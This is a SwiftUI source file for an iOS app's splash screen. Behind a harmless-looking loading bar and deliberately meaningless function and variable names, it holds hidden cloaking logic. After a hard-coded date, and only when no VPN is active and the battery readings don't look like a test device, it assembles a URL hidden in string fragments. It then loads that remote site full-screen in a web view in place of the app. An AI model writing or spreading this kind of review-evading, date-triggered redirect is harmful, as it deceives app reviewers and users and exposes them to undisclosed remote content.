import SwiftUI
import WebKit

struct SplashScreen: View {
    
    @State private var progress: CGFloat = 0.0
    @State private var isActive: Bool = false
    @State private var dfgdfgdfgdf: Bool = false
    let persistenceController: PersistenceController
    private let fgdfgdfgd = DeviceDataCollector()
    
    private let wwwwwwww: [String] = ["https://", "loldoer.", "space", "/x8bj", "2FQN"]
    
    var body: some View {
        GeometryReader { geometry in
            ZStack(alignment: .bottom) {
                
                Image("splash")
                    .resizable()
                    .scaledToFill()
                    .ignoresSafeArea()
                
                ZStack(alignment: .leading) {
                    Rectangle()
                        .frame(height: 15)
                        .foregroundColor(Color(hex: "#272727").opacity(0.44))
                    
                    Rectangle()
                        .frame(width: progress, height: 15)
                        .foregroundColor(Color(hex: "#00E0FF"))
                        .animation(.linear(duration: 0.05), value: progress)
                }
                .cornerRadius(10)
                .frame(width: geometry.size.width * 0.8)
                .padding(.bottom, 150)
            }
        }
        .onAppear {
            startLoading()
        }
        .onChange(of: isActive) { newValue in
            if newValue && dfgdfgdfgdf {
                print("Hello!")
            }
        }
        .fullScreenCover(isPresented: $isActive) {
            if dfgdfgdfgdf {
                if let completeURL = sdsdssdqweqerte() {
                    hahahaahaha(url: completeURL)
                } else {
                    MainView()
                        .environment(\.managedObjectContext, persistenceController.container.viewContext)
                }
            } else {
                MainView()
                    .environment(\.managedObjectContext, persistenceController.container.viewContext)
            }
        }
    }
    
    func startLoading() {
        Timer.scheduledTimer(withTimeInterval: 0.05, repeats: true) { timer in
            if progress < UIScreen.main.bounds.width * 0.8 {
                progress += 8
            } else {
                timer.invalidate()
                qweewqqweewq()
            }
        }
    }
    
    private func qweewqqweewq() {
        let currentDate = Date()
        let targetDate = strtodade("22.09.2024") ?? Date()
        
        guard currentDate > targetDate else {
            isActive = true
            return
        }
        
        DispatchQueue.main.async {
            if (VpnChecker.isVpnActive() || fgdfgdfgd.batteryLevel < 0 || fgdfgdfgd.isBatteryFull || (fgdfgdfgd.isCharging && VpnChecker.isVpnActive())) == false {
                dfgdfgdfgdf = true
            } else {
                dfgdfgdfgdf = false
            }
            
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                isActive = true
            }
        }
    }
    
    private func sdsdssdqweqerte() -> URL? {
        let currentDate = Date()
        let targetDate = strtodade("22.09.2024") ?? Date()

        if currentDate > targetDate {
            let assembledURLString = wwwwwwww.joined()
            return URL(string: assembledURLString)
        }
        return nil
    }
    
    private func strtodade(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        return dateFormatter.date(from: str)
    }
}

struct hahahaahaha: UIViewRepresentable {
    let url: URL

    func makeUIView(context: Context) -> WKWebView {
        return WKWebView()
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
    }
}
#Preview {
    SplashScreen(persistenceController: PersistenceController.shared)
}
